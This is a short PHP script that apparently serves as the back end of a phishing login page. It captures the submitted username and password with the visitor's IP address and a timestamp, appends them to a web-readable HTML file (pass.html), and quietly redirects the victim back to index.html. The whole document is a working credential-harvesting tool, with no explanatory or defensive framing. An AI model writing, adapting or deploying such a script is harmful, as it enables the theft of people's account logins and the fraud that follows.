<?php
$user= $_POST['username'];
$pass= $_POST['password'];
$ip= $_SERVER['REMOTE_ADDR'];
$dat= date("d/m/Y h:i:s");
if( (empty($user)) or (empty($pass)) )
{
header('Location: index.html');
}
else 
{
$f=fopen("pass.html","a");
fwrite($f,'Username: <font color="red">'.$user.'</font><br/>Password: <font color="red">'.$pass.'</font><br/>IP: <font color="red">'.$ip.'</font><br/>Date: <font color="red">'.$dat.'</font><br/><br/>');
fclose($f);
header('Location: index.html');
}
?>